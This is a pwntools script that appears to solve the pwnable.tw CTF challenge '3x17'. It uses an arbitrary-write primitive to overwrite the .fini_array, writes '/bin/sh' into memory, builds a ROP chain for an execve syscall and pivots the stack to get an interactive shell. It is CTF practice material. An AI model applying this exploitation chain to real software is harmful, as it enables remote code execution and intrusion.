#!/home/khanh/.local/share/pipx/venvs/pwntools/bin/python3

from pwn import *

# context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']

e = context.binary = ELF("./3x17")
# libc = ELF("./libc.so.6")

# HELPER
def B(x, enc='utf-8'):
    if isinstance(x, bytes):
        return x
    return str(x).encode(enc)

def connect():
    HOST, PORT = "chall.pwnable.tw", 10105

    if len(sys.argv) > 1 and sys.argv[1] == 'r':
        return remote(HOST, PORT)

    return e.process()

def GDB(p):
    script = '''
    '''
    gdb.attach(p, gdbscript=script)


# OFFSET & VARIABLES
main_addr = 0x401b6d
fini_array = 0x4b40f0
fini_array_caller = 0x402960
chain_start = 0x4b4100

leave_ret = 0x401c4b
pop_rax = 0x41e4af
pop_rdx = 0x446e35
pop_rsi = 0x406c30
pop_rdi = 0x401696
syscall = 0x4022b4

# FUNCTIONS
def write(p, address, data):
    p.sendlineafter(b"addr:", str(address))
    p.sendafter(b"data:", B(data))

# MAIN
def main():
    p = connect()

    write(p, fini_array, p64(fini_array_caller) + p64(main_addr))

    write(p, 0x4b70e0, b"/bin/sh\x00")
    
    write(p, chain_start, p64(0x3b))
    write(p, chain_start + 8, p64(pop_rdx) + p64(0))
    write(p, chain_start + 24, p64(pop_rsi) + p64(0))
    write(p, chain_start + 40, p64(pop_rdi) + p64(0x4b70e0))
    write(p, chain_start + 56, p64(syscall))

    write(p, fini_array, p64(leave_ret) + p64(pop_rax))

    p.interactive()


if __name__ == '__main__':
    main()